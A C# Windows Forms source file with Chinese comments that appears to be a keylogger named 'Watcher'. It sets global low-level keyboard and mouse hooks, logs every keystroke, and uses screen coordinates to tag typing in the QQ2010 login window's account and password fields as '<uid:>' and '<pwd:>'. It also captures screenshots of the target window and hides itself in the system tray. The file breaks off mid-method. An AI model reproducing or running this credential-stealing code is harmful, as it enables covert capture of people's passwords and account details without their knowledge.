using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Drawing.Imaging;
namespace Watcher
{
    public partial class KeyRecord : Form
    {
       /***
         * SetWindowsHookEx(int idHook, HookProc Ipfn, IntPtr hMod, int dwThreadId);//设置钩子
         * idHook:钩子的类型，它处理消息的类型
         * HookProc钩子子程的地址指针。如果chThreaId数为0或是一个由别的进程创建的线程标识，
         * Ipfn必须只想DLL中的钩子子程。除此之外，Ipfn可以指向当前进程的一段钩子子程代码。
         * **/
        #region 申明 API
        //-------------------------HOOK--------------------------------------
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern int SetWindowsHookEx(int idHook, HookProc Ipfn, IntPtr hMod, int dwThreadId);//设置钩子

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(int idHook);//卸载钩子

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern int CallNextHookEx(int idHook, int nCode, Int32 wParam, IntPtr IParam);//继续下一个钩子

        [DllImport("user32")]
        private static extern int ToAscii(int uVirtKey, int uScanCode, byte[] IpbKeyState, byte[] IpwTransKey, int fuState);

        //-------------------------FindWindow--------------------------------------
        [DllImport("user32.dll", EntryPoint = "FindWindowA")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);//查找窗口
        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);//找子窗体
        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        private static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, string IParam);//用于发送信息给窗体
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);//设置进程窗口到最前
        [DllImport("user32")]
        private static extern int GetWindowRect(IntPtr hwnd,ref RECT lpRect);//获取指定窗口的矩形区域 
        [DllImport("user32")]
        private static extern int GetWindowPlacement(IntPtr hwnd,ref WINDOWPLACEMENT lpwndpl);//获得指定窗口的状态及位置信息

        [DllImport("kernel32.dll")]//获取模块句柄  
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        //-----------------------------KeyboardState----------------------------------------
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);//获取键状态
        #endregion

        //创建委托
        public delegate int HookProc(int nCode, Int32 wParam, IntPtr IParam);

        #region 初始化成员变量
        private const int WM_KEYDOWN = 0x100;//键按下 256（int）
        static int hKeyboardHook = 0;
        public const int WH_KEYBOARD_LL = 13;
        HookProc hookp;
        string ShiftState = "0";
        bool CapitalState = false;

        //定义鼠标常熟
        private const int WM_MOUSEMOVE = 0x200;//鼠标移动 512（int）
        private const int WM_LBUTTONDOWN = 0x201;//鼠标左键 513（int）
        private const int WM_RBUTTONDOWN = 0x204;//鼠标右键 516（int）
        private const int WM_MBUTTONDOWN = 0x207;//鼠标中健 519（int）
        private const int WM_LBUTTONUP = 0x202;//左键弹起 514（int）
        private const int WM_RBUTTONUP = 0x205;//右键弹起 517（int）
        private const int WM_MBUTTONUP = 0x208;//中健弹起 520（int）
        private const int WM_LBUTTONDBLCLK = 0x203;//双击左键 515（int）
        private const int WM_RBUTTONDBLCLK = 0x206;//双击右键 518（int）
        private const int WM_MBUTTONDBLCLK = 0x209;//双击中健 521（int）
        //全局的事件 
        public event MouseEventHandler OnMouseActivity;
        static int hMouseHook = 0;   //鼠标钩子句柄 
        //鼠标常量 
        public const int WH_MOUSE_LL = 14;   //mouse   hook   constant 
        HookProc MouseHookProcedure;   //声明鼠标钩子事件类型.

        //获取窗口拖动前的的坐标
        string IsLeftChange = "";
        string IsTopChange = "";

        new int Left = 0;
        new int Right = 0;
        new int Top = 0;
        new int Bottom = 0;

        private int isMouseDown = 0x000;
        #endregion

        public KeyRecord()
        {
            InitializeComponent();
        }
        
       
        #region 键盘钩子处理
        /// <summary>
        /// Hook API
        /// </summary>
        /// <param name="nCode">传给钩子的事件代码</param>
        /// <param name="wParam">按键状态（按下还是放开）</param>
        /// <param name="IParam">按键句柄</param>
        /// <returns></returns>
        private int KeyboardHookProc(int nCode, Int32 wParam, IntPtr IParam)
        {
            string Info = "";
            KeyMSG keys = (KeyMSG)Marshal.PtrToStructure(IParam, typeof(KeyMSG));//获取Key
            CapitalState = (((ushort)GetKeyState(0x14)) != 0 && 0xffff != ((ushort)GetKeyState(0x14)));//获取当前Caps Lock键是否打开
            //MessageBox.Show(((Keys)keys.vkCode).ToString());
            if (hKeyboardHook != 0)//当前钩子是否被卸载
            {
                if (wParam == WM_KEYDOWN)//键盘在按下的时候
                {
                    switch ((Keys)keys.vkCode)
                    {
                        #region Shift键
                        case Keys.ShiftKey:
                        case Keys.LShiftKey:
                        case Keys.RShiftKey:
                        case Keys.Shift:
                            Info = "";
                            ShiftState = "1"; break;
                        #endregion

                        #region 连续退格
                        case Keys.Back:
                            Info = "";
                            if (this.txtRecordInfo.Text.Length > 0)
                                this.txtRecordInfo.Text = this.txtRecordInfo.Text.Substring(0, this.txtRecordInfo.Text.Length - 1); break;
                        #endregion

                        #region Caps Lock控制
                        case Keys.Capital:
                            keybd_event(0x14, 0x45, 0x1, (UIntPtr)0);
                            keybd_event(0x14, 0x45, 0x1 | 0x2, (UIntPtr)0);
                            Info = "";
                            break;
                        #endregion
                    }
                }
                else
                {
                    #region 键松开时处理
                    if (ShiftState == "1") //如果当前Shift键被按住，则切换键上标符号
                    {
                        #region 根据用户的按键进行响应处理
                        switch ((Keys)keys.vkCode)
                        {
                            #region Shift键 如果当前Shift松开
                            case Keys.ShiftKey:
                            case Keys.LShiftKey:
                            case Keys.RShiftKey:
                            case Keys.Shift:
                                Info = "";
                                ShiftState = "0"; break;
                            #endregion

                            #region 数字键 0~9
                            case Keys.D0:
                                Info = ")"; break;
                            case Keys.D1:
                                Info = "!"; break;
                            case Keys.D2:
                                Info = "@"; break;
                            case Keys.D3:
                                Info = "#"; break;
                            case Keys.D4:
                                Info = "$"; break;
                            case Keys.D5:
                                Info = "%"; break;
                            case Keys.D6:
                                Info = "^"; break;
                            case Keys.D7:
                                Info = "&"; break;
                            case Keys.D8:
                                Info = "*"; break;
                            case Keys.D9:
                                Info = "("; break;
                            #endregion

                            #region 符号
                            case Keys.Oemcomma:
                                Info = "<"; break;
                            case Keys.OemPeriod:
                                Info = ">"; break;
                            case Keys.Oemtilde:
                                Info = "~"; break;
                            case Keys.OemSemicolon:
                                Info = ":"; break;
                            case Keys.OemQuotes:
                                Info = "/"; break;
                            case Keys.OemPipe:
                                Info = @"|"; break;
                            case Keys.OemCloseBrackets:
                                Info = "}"; break;
                            case Keys.OemOpenBrackets:
                                Info = "{"; break;
                            case Keys.OemQuestion:
                                Info = "?"; break;
                            #endregion

                            #region 算术符号
                            case Keys.Oemplus:
                                Info = "+"; break;
                            case Keys.OemMinus:
                                Info = "_"; break;
                            #endregion

                            case Keys.Decimal:
                                Info = "[Del]"; break;
                        }

                        #endregion

                        #region 根据当前Caps Lock键的状态（使用Shift键）切换大小写
                        if (CapitalState == true)
                        {
                            switch ((Keys)keys.vkCode)
                            {
                                #region a-z
                                case Keys.A:
                                    Info = "a"; break;
                                case Keys.B:
                                    Info = "b"; break;
                                case Keys.C:
                                    Info = "c"; break;
                                case Keys.D:
                                    Info = "d"; break;
                                case Keys.E:
                                    Info = "e"; break;
                                case Keys.F:
                                    Info = "f"; break;
                                case Keys.G:
                                    Info = "g"; break;
                                case Keys.H:
                                    Info = "h"; break;
                                case Keys.I:
                                    Info = "i"; break;
                                case Keys.J:
                                    Info = "j"; break;
                                case Keys.K:
                                    Info = "k"; break;
                                case Keys.L:
                                    Info = "l"; break;
                                case Keys.M:
                                    Info = "m"; break;
                                case Keys.N:
                                    Info = "n"; break;
                                case Keys.O:
                                    Info = "o"; break;
                                case Keys.P:
                                    Info = "p"; break;
                                case Keys.Q:
                                    Info = "q"; break;
                                case Keys.R:
                                    Info = "r"; break;
                                case Keys.S:
                                    Info = "s"; break;
                                case Keys.T:
                                    Info = "t"; break;
                                case Keys.U:
                                    Info = "u"; break;
                                case Keys.V:
                                    Info = "v"; break;
                                case Keys.W:
                                    Info = "w"; break;
                                case Keys.X:
                                    Info = "x"; break;
                                case Keys.Y:
                                    Info = "y"; break;
                                case Keys.Z:
                                    Info = "z"; break;
                                #endregion
                            }
                        }
                        else
                        {
                            switch ((Keys)keys.vkCode)
                            {
                                #region a-z
                                case Keys.A:
                                    Info = "A"; break;
                                case Keys.B:
                                    Info = "B"; break;
                                case Keys.C:
                                    Info = "C"; break;
                                case Keys.D:
                                    Info = "D"; break;
                                case Keys.E:
                                    Info = "E"; break;
                                case Keys.F:
                                    Info = "F"; break;
                                case Keys.G:
                                    Info = "G"; break;
                                case Keys.H:
                                    Info = "H"; break;
                                case Keys.I:
                                    Info = "I"; break;
                                case Keys.J:
                                    Info = "J"; break;
                                case Keys.K:
                                    Info = "K"; break;
                                case Keys.L:
                                    Info = "L"; break;
                                case Keys.M:
                                    Info = "M"; break;
                                case Keys.N:
                                    Info = "N"; break;
                                case Keys.O:
                                    Info = "O"; break;
                                case Keys.P:
                                    Info = "P"; break;
                                case Keys.Q:
                                    Info = "Q"; break;
                                case Keys.R:
                                    Info = "R"; break;
                                case Keys.S:
                                    Info = "S"; break;
                                case Keys.T:
                                    Info = "T"; break;
                                case Keys.U:
                                    Info = "U"; break;
                                case Keys.V:
                                    Info = "V"; break;
                                case Keys.W:
                                    Info = "W"; break;
                                case Keys.X:
                                    Info = "X"; break;
                                case Keys.Y:
                                    Info = "Y"; break;
                                case Keys.Z:
                                    Info = "Z"; break;
                                #endregion
                            }
                        }
                        #endregion
                    }
                    else
                    {
                        #region 根据用户的按键进行响应处理
                        switch ((Keys)keys.vkCode)
                        {
                            case Keys.LWin:
                            case Keys.NumLock:
                            case Keys.RWin:
                            case Keys.Apps:

                            #region Print Screen/SysRq、Scroll Lock、Pause/Break
                            case Keys.PrintScreen:
                            case Keys.Scroll:
                            case Keys.Pause:
                            #endregion
                            #region Alt键
                            case Keys.Alt:
                            case Keys.LMenu:
                            case Keys.RMenu:
                            #endregion
                            #region Escape、F1~F12
                            case Keys.Escape:
                            case Keys.F1:
                            case Keys.F2:
                            case Keys.F3:
                            case Keys.F4:
                            case Keys.F5:
                            case Keys.F6:
                            case Keys.F7:
                            case Keys.F8:
                            case Keys.F9:
                            case Keys.F10:
                            case Keys.F11:
                            case Keys.F12:
                                Info = ""; break;
                            #endregion
                            #region Ctrl键
                            case Keys.Control:
                            case Keys.LControlKey:
                            case Keys.RControlKey:
                            case Keys.ControlKey:
                            case Keys.Crsel:
                                Info = "[Ctrl]"; break;
                            #endregion
                            #region 其他键
                            case Keys.Tab:
                                Info = "<pass:>:"; break;
                            case Keys.Enter:
                                Info = "回车"; timer3.Enabled = true; break;
                            case Keys.CapsLock:
                                Info = ""; break;
                            case Keys.Back:
                                Info = ""; break;
                            #endregion
                            #region 符号
                            case Keys.Space:
                                Info = "空格"; break;
                            case Keys.Oemcomma:
                                Info = ","; break;
                            case Keys.OemPeriod:
                                Info = "."; break;
                            case Keys.Oemtilde:
                                Info = "`"; break;
                            case Keys.OemSemicolon:
                                Info = ";"; break;
                            case Keys.OemQuotes:
                                Info = "/'"; break;
                            case Keys.OemPipe:
                                Info = @"/"; break;
                            case Keys.OemCloseBrackets:
                                Info = "]"; break;
                            case Keys.OemOpenBrackets:
                                Info = "["; break;
                            case Keys.OemQuestion:
                                Info = "/"; break;
                            case Keys.Decimal:
                                Info = "."; break;
                            #endregion
                            #region 数字键 0~9
                            case Keys.D0:
                                Info = "0"; break;
                            case Keys.D1:
                                Info = "1"; break;
                            case Keys.D2:
                                Info = "2"; break;
                            case Keys.D3:
                                Info = "3"; break;
                            case Keys.D4:
                                Info = "4"; break;
                            case Keys.D5:
                                Info = "5"; break;
                            case Keys.D6:
                                Info = "6"; break;
                            case Keys.D7:
                                Info = "7"; break;
                            case Keys.D8:
                                Info = "8"; break;
                            case Keys.D9:
                                Info = ""; break;
                            #endregion
                            #region 编辑键 [Insert、Home、PageDown、End、Delete、PageUp]
                            case Keys.Insert:
                            case Keys.Home:
                            case Keys.PageDown:
                            case Keys.End:
                            case Keys.Delete:
                            case Keys.PageUp:
                                Info = ""; break;
                            #endregion
                            #region 方向键 [↑、↓、←、→]
                            case Keys.Up:
                                Info = "↑"; break;
                            case Keys.Down:
                                Info = "↓"; break;
                            case Keys.Left:
                                Info = "←"; break;
                            case Keys.Right:
                                Info = "→"; break;
                            #endregion
                            #region 算术符号 *、+、-、/
                            case Keys.Multiply:
                                Info = "*"; break;
                            case Keys.Oemplus:
                                Info = "="; break;
                            case Keys.OemMinus:
                                Info = "-"; break;
                            case Keys.Add:
                                Info = "+"; break;
                            case Keys.Divide:
                                Info = "/"; break;
                            case Keys.Subtract:
                                Info = "-"; break;
                            #endregion
                            #region 小键盘 0~9
                            case Keys.NumPad0:
                                Info = "0"; break;
                            case Keys.NumPad1:
                                Info = "1"; break;
                            case Keys.NumPad2:
                                Info = "2"; break;
                            case Keys.NumPad3:
                                Info = "3"; break;
                            case Keys.NumPad4:
                                Info = "4"; break;
                            case Keys.NumPad5:
                                Info = "5"; break;
                            case Keys.NumPad6:
                                Info = "6"; break;
                            case Keys.NumPad7:
                                Info = "7"; break;
                            case Keys.NumPad8:
                                Info = "8"; break;
                            case Keys.NumPad9:
                                Info = "9"; break;
                            #endregion
                            default:
                                Info = Convert.ToChar(keys.vkCode).ToString(); break;
                        }
                        #endregion

                        #region 根据当前Caps Lock键的状态（没有使用Shift键）切换大小写
                        if (CapitalState == true)
                        {
                            switch ((Keys)keys.vkCode)
                            {
                                #region a-z
                                case Keys.A:
                                    Info = "A"; break;
                                case Keys.B:
                                    Info = "B"; break;
                                case Keys.C:
                                    Info = "C"; break;
                                case Keys.D:
                                    Info = "D"; break;
                                case Keys.E:
                                    Info = "E"; break;
                                case Keys.F:
                                    Info = "F"; break;
                                case Keys.G:
                                    Info = "G"; break;
                                case Keys.H:
                                    Info = "H"; break;
                                case Keys.I:
                                    Info = "I"; break;
                                case Keys.J:
                                    Info = "J"; break;
                                case Keys.K:
                                    Info = "K"; break;
                                case Keys.L:
                                    Info = "L"; break;
                                case Keys.M:
                                    Info = "M"; break;
                                case Keys.N:
                                    Info = "N"; break;
                                case Keys.O:
                                    Info = "O"; break;
                                case Keys.P:
                                    Info = "P"; break;
                                case Keys.Q:
                                    Info = "Q"; break;
                                case Keys.R:
                                    Info = "R"; break;
                                case Keys.S:
                                    Info = "S"; break;
                                case Keys.T:
                                    Info = "T"; break;
                                case Keys.U:
                                    Info = "U"; break;
                                case Keys.V:
                                    Info = "V"; break;
                                case Keys.W:
                                    Info = "W"; break;
                                case Keys.X:
                                    Info = "X"; break;
                                case Keys.Y:
                                    Info = "Y"; break;
                                case Keys.Z:
                                    Info = "Z"; break;
                                #endregion
                            }
                        }
                        else
                        {
                            switch ((Keys)keys.vkCode)
                            {
                                #region a-z
                                case Keys.A:
                                    Info = "a"; break;
                                case Keys.B:
                                    Info = "b"; break;
                                case Keys.C:
                                    Info = "c"; break;
                                case Keys.D:
                                    Info = "d"; break;
                                case Keys.E:
                                    Info = "e"; break;
                                case Keys.F:
                                    Info = "f"; break;
                                case Keys.G:
                                    Info = "g"; break;
                                case Keys.H:
                                    Info = "h"; break;
                                case Keys.I:
                                    Info = "i"; break;
                                case Keys.J:
                                    Info = "j"; break;
                                case Keys.K:
                                    Info = "k"; break;
                                case Keys.L:
                                    Info = "l"; break;
                                case Keys.M:
                                    Info = "m"; break;
                                case Keys.N:
                                    Info = "n"; break;
                                case Keys.O:
                                    Info = "o"; break;
                                case Keys.P:
                                    Info = "p"; break;
                                case Keys.Q:
                                    Info = "q"; break;
                                case Keys.R:
                                    Info = "r"; break;
                                case Keys.S:
                                    Info = "s"; break;
                                case Keys.T:
                                    Info = "t"; break;
                                case Keys.U:
                                    Info = "u"; break;
                                case Keys.V:
                                    Info = "v"; break;
                                case Keys.W:
                                    Info = "w"; break;
                                case Keys.X:
                                    Info = "x"; break;
                                case Keys.Y:
                                    Info = "y"; break;
                                case Keys.Z:
                                    Info = "z"; break;
                                #endregion
                            }
                        }
                        #endregion
                    }
                    this.txtRecordInfo.Text += Info;
                    #endregion
                }

                if (!string.IsNullOrEmpty(this.txtRecordInfo.Text) && this.txtRecordInfo.Text.Length>=3 && timer3.Enabled == false)
                {
                    timer3.Enabled = true;
                    timer3.Start();
                }
            }
            return CallNextHookEx(hKeyboardHook, nCode, wParam, IParam);
        }
        #endregion

        #region 鼠标钩子处理
        private int MouseHookProc(int nCode, Int32 wParam, IntPtr lParam)
        {
            #region
            //如果正常运行并且用户要监听鼠标的消息 
            if ((nCode >= 0) && (OnMouseActivity != null))
            {
                MouseButtons button = MouseButtons.None;
                int clickCount = 0;
                isMouseDown = wParam;
                switch (wParam)
                {
                    case WM_LBUTTONDOWN:
                        button = MouseButtons.Left;
                        clickCount = 1;
                        break;
                    case WM_LBUTTONUP:
                        button = MouseButtons.Left;
                        clickCount = 1;
                        break;
                    case WM_LBUTTONDBLCLK:
                        button = MouseButtons.Left;
                        clickCount = 2;
                        break;
                    case WM_RBUTTONDOWN:
                        button = MouseButtons.Right;
                        clickCount = 1;
                        break;
                    case WM_RBUTTONUP:
                        button = MouseButtons.Right;
                        clickCount = 1;
                        break;
                    case WM_RBUTTONDBLCLK:
                        button = MouseButtons.Right;
                        clickCount = 2;
                        break;
                }
                //从回调函数中得到鼠标的信息 
                MouseHookStruct MyMouseHookStruct = (MouseHookStruct)Marshal.PtrToStructure(lParam, typeof(MouseHookStruct));
                MouseEventArgs e = new MouseEventArgs(button, clickCount, MyMouseHookStruct.pt.x, MyMouseHookStruct.pt.y, 0);
                OnMouseActivity(this, e);
            }
            return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
            #endregion
        }
        #endregion

        #region FinWindow
        /// <summary>
        /// FinWindow API
        /// </summary>
        /// <param name="lpszParentClass">lpszParentClass = "#32770";//整个窗口的类名</param>
        /// <param name="lpszParentWindow">窗口标题</param>
        /// <returns>int</returns>
        /// 
        private int SearchWindow(string lpszParentClass, string lpszParentWindow)
        {
            //string Save_Submit = "Button";//需要查找的Button类名
            //string Save_type = "Edit";
            //string text = "";
            IntPtr ParenthWnd = new IntPtr(0);
            //IntPtr EdithWnd = new IntPtr(0);//找到窗体，得到整个窗体
            ParenthWnd = FindWindow(lpszParentClass, lpszParentWindow);//判断这个窗体是否有效
            if (!ParenthWnd.Equals(IntPtr.Zero))
            {
                MessageBox.Show("存在");
            }
            else
            {
                MessageBox.Show("不存在");
            }

            #region//得到User这个子窗体，并设置起内容
            //EdithWnd = FindWindowEx(ParenthWnd, EdithWnd, Save_Submit, "");//获取button句柄

            //if (!EdithWnd.Equals(IntPtr.Zero))
            //    MessageBox.Show("保存按钮存在");
            //else
            //{
            //    MessageBox.Show("保存按钮不存在");
            //}

            //EdithWnd = FindWindowEx(ParenthWnd, EdithWnd, Save_type, "");//获取button句柄
            //if (!EdithWnd.Equals(IntPtr.Zero))
            //    MessageBox.Show("文件类型框存在");
            //else
            //{
            //    MessageBox.Show("文件类型框不存在");
            //}
            #endregion

            return ParenthWnd.ToInt32();
        }
        #endregion

        #region 键盘钩子结构体
        /// <summary>
        /// 将API申明为.net结构体
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        public struct KeyMSG
        {
            public int vkCode;//键符虚拟码
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        #endregion

        #region 鼠标钩子结构体
        //声明一个Point的封送类型 
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x;
            public int y;
        }
        //声明鼠标钩子的封送结构类型 
        [StructLayout(LayoutKind.Sequential)]
        public struct MouseHookStruct
        {
            public POINT pt;
            public int hWnd;
            public int wHitTestCode;
            public int dwExtraInfo;
        }
        #endregion

        #region 获取窗口坐标结构体
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINTAPI
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WINDOWPLACEMENT
        {
            public int Length;
            public int flags;
            public int showCmd;
            public POINTAPI ptMinPosition;
            public POINTAPI ptMaxPosition;
            public RECT rcNormalPosition;
        }
        #endregion

        #region 鼠标事件
        int LClickCount = 0;
        int RClickCount = 0;
        private void WinProcTest_Mouse(object sender, MouseEventArgs e)
        {
            this.lblXCoor.Text = e.X.ToString();
            this.lblYCoor.Text = e.Y.ToString();
            if (e.Button == MouseButtons.Left)
            {
                if (isMouseDown == 0x201)//鼠标按下时
                {
                    if (LClickCount < 10000)
                        LClickCount += e.Clicks;
                    else
                        LClickCount = 0;
                    this.label3.Text = LClickCount.ToString();

                    #region 获取QQ2010帐号和密码框的位置
                    if ((e.X >= Left + 56) && (e.X <= Left + 250) && (e.Y >= Top + 107) && (e.Y <= Top + 132))
                    {
                        this.txtRecordInfo.Text = "<uid:>";
                        this.timer3.Enabled = true;
                    }
                    if ((e.X >= Left + 56) && (e.X <= Left + 250) && (e.Y >= Top + 144) && (e.Y <= Top + 168))
                    {
                        this.txtRecordInfo.Text = "<pwd:>";
                        this.timer3.Enabled = true;
                    }
                    #endregion
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                if (RClickCount < 10000)
                    RClickCount += e.Clicks;
                else
                    RClickCount = 0;
                this.label4.Text = (RClickCount / 2).ToString();
            }
            if (e.Button == MouseButtons.Middle)
            {
                this.label5.Text = "鼠标中键";
            }
        }
        #endregion

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            timer3.Enabled = false;

            #region 获取屏幕分辨率
            //Rectangle rect = new Rectangle();
            ////rect = Screen.GetWorkingArea(this);
            //rect = Screen.PrimaryScreen.Bounds;
            //this.txtScreenWidth.Text = rect.Width.ToString();
            //this.txtScreenHeight.Text = rect.Height.ToString();
            #endregion

            #region 打开Capslock键
            /*
            const int KEYEVENTF_EXTENDEDKEY = 0x1;
            const int KEYEVENTF_KEYUP = 0x2;
            
(0x14, 0x45, KEYEVENTF_EXTENDEDKEY, (UIntPtr)0);
            keybd_event(0x14, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, (UIntPtr)0);
            #endregion

            #region 获取 Capslock键、Numlock键、ScrollLock键的开启状态
            bool Capslock = (((ushort)GetKeyState(0x14)) != 0 && 0xffff != ((ushort)GetKeyState(0x14)));
            bool NumLock = (((ushort)GetKeyState(0x90)) != 0 && 0xffff != ((ushort)GetKeyState(0x90)));
            bool ScrollLock = (((ushort)GetKeyState(0x91)) != 0 && 0xffff != ((ushort)GetKeyState(0x90)));
            MessageBox.Show("Capslock is on:" + Capslock.ToString());
             */
            #endregion

            string IsLeftChange = this.lblMarginLeft.Text;
            string IsTopChange = this.lblMarginTop.Text;
            timer2.Enabled = true;
            timer2.Start();
            //ExcuteRegistry();
         
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        #region 监控指定程序
       
        #endregion

        

        #region 执行批处理
        private void ExcuteBAT()
        {
            Process pro = new Process();
            try
            {
                pro.StartInfo.FileName = "cmd.exe";
                pro.StartInfo.UseShellExecute = false;
                pro.StartInfo.RedirectStandardInput = true;
                pro.StartInfo.RedirectStandardOutput = true;
                pro.StartInfo.CreateNoWindow = true;
                pro.Start();
                pro.StandardInput.WriteLine("pasue");
            }
            catch { }
            finally
            {
                pro.Close();
                pro.Dispose();
            }

        }
        #endregion

        #region 执行注册表
        private void ExcuteRegistry()
        {
            RegistryKey rkRoot = Registry.ClassesRoot;
            RegistryKey rkCurrentUser = Registry.CurrentUser;
            RegistryKey rkLocalMachine = Registry.LocalMachine;
            RegistryKey rkUser = Registry.Users;
            RegistryKey rkCurrentConfig = Registry.CurrentConfig;

            RegistryKey rk1 = rkLocalMachine.CreateSubKey("SoftWare//Microsoft//Windows//CurrentVersion//Run");
            string[] key = rk1.GetValueNames();
            ListViewItem lvi=new ListViewItem();
            for (int i = 0; i < key.Length; i++)
            {
                lvi=this.lsvRegistry.Items.Add(key[i].ToString());//
                lvi.SubItems.Add(rk1.GetValue(key[i].ToString(),"undefined").ToString());
                lvi.SubItems.Add(rk1.GetValueKind(key[i].ToString()).ToString());
            }
            rk1.Close();
        }
        #endregion

        #region 截图
        /// <summary>
        /// 窗口截图
        /// </summary>
        /// <param name="ImageWidth">图片宽度</param>
        /// <param name="ImageHeight">图片高度</param>
        /// <param name="sourseX">位于源矩形左上角的X坐标</param>
        /// <param name="sourseY">位于源矩形左上角的Y坐标</param>
        /// <param name="destinationX">位于目标矩形左上角的X坐标</param>
        /// <param name="destinationY">位于目标矩形左上角的Y坐标</param>
        /// <param name="blockRegionSize">要传输区域的大小</param>
        private void CutImage(int ImageWidth,int ImageHeight,int sourseX,int sourseY,int destinationX,int destinationY,Size blockRegionSize)
        {

            Rectangle rect = new Rectangle();
            //rect = Screen.GetWorkingArea(this);
            rect = Screen.PrimaryScreen.Bounds;
            ImageWidth = rect.Width;
            ImageHeight = rect.Height;

            //创建图象，保存将来截取的图象
            Bitmap image = new Bitmap(ImageWidth, ImageHeight);
            Graphics imgGraphics = Graphics.FromImage(image);
            //设置截屏区域
            imgGraphics.CopyFromScreen(sourseX, sourseY, destinationX, destinationY, new Size(ImageWidth, ImageHeight));

            string fileName = DateTime.Now.ToString("yyyyMMddHHmmss") + DateTime.Now.Millisecond.ToString() + ".jpg";
            string extension = Path.GetExtension(fileName);
            if (extension == ".jpg")
            {
                image.Save(fileName, ImageFormat.Jpeg);
            }
            else
            {
                image.Save(fileName, ImageFormat.Bmp);
            }
        }
        #endregion

        private void KeyRecord_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
                this.notifyIcon1.Visible = true;
            }
        }

        private void notifyIcon1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                
            }
            else if (e.Button == MouseButtons.Left)
            {
                this.Visible = true;
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void txtCaption_MouseClick(object sender, MouseEventArgs e)
        {
            this.txtCaption.SelectAll();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.timer2.Enabled = true;
            this.timer2.Start(); 
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            //this.Hide();
            IntPtr ParenthWnd = new IntPtr(0);
            string Caption = this.txtCaption.Text;
            
            if (!string.IsNullOrEmpty(Caption))
            {
              
                ParenthWnd = FindWindow(null, "Miner");
              
                if (!ParenthWnd.Equals(IntPtr.Zero))//判断指定的窗体是否运行
                {
                    //SetForegroundWindow(ParenthWnd);//将当前窗口锁定在最前
                   // timer1.Enabled = true;

                    #region 获取窗口位置
                    //RECT rect = new RECT();
                    //GetWindowRect(ParenthWnd, ref rect);
                    //this.lblMarginLeft.Text = rect.Left.ToString();
                    //this.lblMarginRight.Text = rect.Right.ToString();
                    //this.lblMarginTop.Text = rect.Top.ToString();
                    //this.lblMarginBottom.Text = rect.Bottom.ToString();

                    WINDOWPLACEMENT wpm = new WINDOWPLACEMENT();
                    GetWindowPlacement(ParenthWnd, ref wpm);
                    Left = wpm.rcNormalPosition.Left;
                    Right = wpm.rcNormalPosition.Right;
                    Top = wpm.rcNormalPosition.Top;
                    Bottom = wpm.rcNormalPosition.Bottom;
                    this.lblMarginLeft.Text = Left.ToString();
                    this.lblMarginRight.Text = Right.ToString();
                    this.lblMarginTop.Text = Top.ToString();
                    this.lblMarginBottom.Text = Bottom.ToString();
                    #endregion

                    #region 截取窗口
                    if ((!IsLeftChange.Equals(this.lblMarginLeft.Text)) || (!IsTopChange.Equals(this.lblMarginTop.Text)))
                    {
                        IsLeftChange = this.lblMarginLeft.Text;
                        IsTopChange = this.lblMarginTop.Text;
                        int Width = Math.Abs(Right - Left);
                        int Height = Math.Abs(Bottom - Top);
                        CutImage(Width, Height, Left, Top, 0, 0, new Size(Width, Height));
                    }
                    #endregion

                    ///运行键盘钩子
                    if (hKeyboardHook == 0)
                    {
                        try
                        {
                            hookp = new HookProc(KeyboardHookProc);
                            hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookp, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
                            // hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookp, GetModuleHandle("Miner.exe"),0);
                            this.gpbKeyboard.Text = "键盘信息(" + hKeyboardHook.ToString() + ")";

                  
                         this.timer2.Stop();
                        }catch(Exception ex)
                        {
                            if (hKeyboardHook != 0)
                            {
                                if (UnhookWindowsHookEx(hKeyboardHook))//卸载当前钩子
                                {
                                    timer1.Enabled = false;
                                }
                                hKeyboardHook = 0;
                            }
                            this.timer2.Start();
                        }
                    }
                    else
                    {
                        #region 卸载钩子
                       // this.txtRecordInfo.Text += "/n/r";
                        if (hKeyboardHook != 0)
                        {
                            if (UnhookWindowsHookEx(hKeyboardHook))//卸载当前钩子
                            {
